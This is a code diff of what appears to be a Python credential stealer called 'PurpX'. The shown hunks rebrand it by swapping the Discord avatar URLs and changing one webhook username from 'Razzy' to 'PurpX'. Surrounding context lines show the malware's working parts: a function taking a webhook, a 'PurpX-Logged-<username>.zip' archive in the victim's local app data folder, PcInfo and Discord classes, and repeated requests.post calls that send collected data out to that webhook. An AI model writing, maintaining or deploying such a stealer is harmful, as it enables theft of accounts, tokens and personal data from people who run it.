@@ -61,7 +61,7 @@ def main(webhook: str):
 
     data = {
         "username": "PurpX",
-        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+        "avatar_url": "https://media.discordapp.net/attachments/1150464646805995672/1150965841798627328/Ak.gif"
     }
 
     _file = f'{localappdata}\\PurpX-Logged-{os.getlogin()}.zip'
@@ -241,7 +241,7 @@ class PcInfo:
                 }
             ],
             "username": "PurpX",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+            "avatar_url": "https://media.discordapp.net/attachments/1150464646805995672/1150965841798627328/Ak.gif"
         }
 
         requests.post(webhook, json=data)
@@ -412,8 +412,8 @@ class Discord:
                                     },
                                 }
                             ],
-                            "username": "Razzy",
-                            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                            "username": "PurpX",
+                            "avatar_url": "https://media.discordapp.net/attachments/1150464646805995672/1150965841798627328/Ak.gif",
                         }
                         requests.post(webhook, json=data)
 
@@ -477,7 +477,7 @@ class Discord:
                     }
                 ],
                 "username": "PurpX",
-                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                "avatar_url": "https://media.discordapp.net/attachments/1150464646805995672/1150965841798627328/Ak.gif",
             }
 
             requests.post(webhook, json=data)
@@ -496,7 +496,7 @@ class Discord:
 
         webhook_data = {
             "username": "PurpX",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "avatar_url": "https://media.discordapp.net/attachments/1150464646805995672/1150965841798627328/Ak.gif",
             "embeds": [
                 {
                     "color": 5639644,
